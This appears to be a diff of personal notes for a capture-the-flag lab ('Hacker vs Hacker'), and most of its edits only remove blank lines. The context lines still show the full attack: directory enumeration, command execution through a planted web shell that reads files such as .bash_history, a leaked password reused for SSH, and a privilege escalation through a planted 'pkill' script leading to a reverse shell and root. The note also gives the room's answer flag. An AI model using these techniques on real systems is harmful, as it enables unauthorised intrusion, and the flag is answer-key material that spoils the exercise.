@@ -4,7 +4,6 @@ Someone has compromised this server already! Can you get in and evade their coun
 
 ![](https://i.imgur.com/5q36e1g.png)
 
-
 ###  Get on and boot them out! 
 
 The server of this recruitment company appears to have been hacked, and the hacker has defeated all attempts by the admins to fix the machine. They can't shut it down (they'd lose SEO!) so maybe you can help?
@@ -49,9 +48,6 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 2022/09/22 12:15:23 Starting gobuster in directory enumeration mode
 ===============================================================
 /shell.pdf.php        (Status: 200) [Size: 18]
-
-
-
 
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ gobuster dir --url http://10.10.247.186/cvs/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -k -x pdf.php,php.pdf                        
@@ -151,11 +147,9 @@ drwxr-xr-x 2 lachlan lachlan 4096 May  5 04:38 .
 drwxr-xr-x 4 lachlan lachlan 4096 May  5 04:39 ..
 -rw-r--r-- 1 lachlan lachlan   56 May  5 04:38 backup.sh
 
-
 http://10.10.247.186/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/bin/backup.sh
 
 # todo: pita website backup as requested by her majesty
-
 
 http://10.10.247.186/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/.bash_history
 
@@ -166,7 +160,6 @@ echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
 ls -sf /dev/null /home/lachlan/.bash_history
 
 ssh lachlan:thisistheway123
-
 
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ ssh lachlan@10.10.247.186
@@ -186,9 +179,7 @@ Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
   Memory usage: 51%               IPv4 address for eth0: 10.10.247.186
   Swap usage:   0%
 
-
 0 updates can be applied immediately.
-
 
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
@@ -226,7 +217,6 @@ https://www.ibm.com/docs/en/zos/2.4.0?topic=socrlp-options
 -T
     Disables pty allocation. This option overrides the -t option.
 
-
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ ssh lachlan@10.10.247.186 -T
 lachlan@10.10.247.186's password: 
@@ -243,18 +233,14 @@ Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
   Memory usage: 50%               IPv4 address for eth0: 10.10.247.186
   Swap usage:   0%
 
-
 0 updates can be applied immediately.
-
 
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
-
 pwd
 /home/lachlan
-
 
 priv esc
 
@@ -275,7 +261,6 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.247.186 - - [22/Sep/2022 12:42:41] "GET /pkill HTTP/1.1" 200 -
 ^C
 Keyboard interrupt received, exiting.
-
 
 pwd
 /home/lachlan
@@ -301,7 +286,6 @@ drwxr-xr-x 4 lachlan lachlan 4096 May  5 04:39 ..
 -rw-r--r-- 1 lachlan lachlan   56 May  5 04:38 backup.sh
 -rwxrwxr-x 1 lachlan lachlan   80 Sep 22 16:42 pkill
 
-
 revshell
 
 ┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
@@ -321,11 +305,7 @@ root@b2r:~# cat root.txt
 cat root.txt
 thm{7b708e5224f666d3562647816ee2a1d4}
 
-
 ```
-
-![[Pasted image 20220922112125.png]]
-
 
 What is the user.txt flag?
 The hacker may have been a bit sloppy in their stealth measures...
@@ -334,6 +314,5 @@ The hacker may have been a bit sloppy in their stealth measures...
 What is the proof.txt flag?
 ...and a bit sloppy in their automated kill scripts.
 *thm{7b708e5224f666d3562647816ee2a1d4}*
-
 
 [[Deja Vu]]
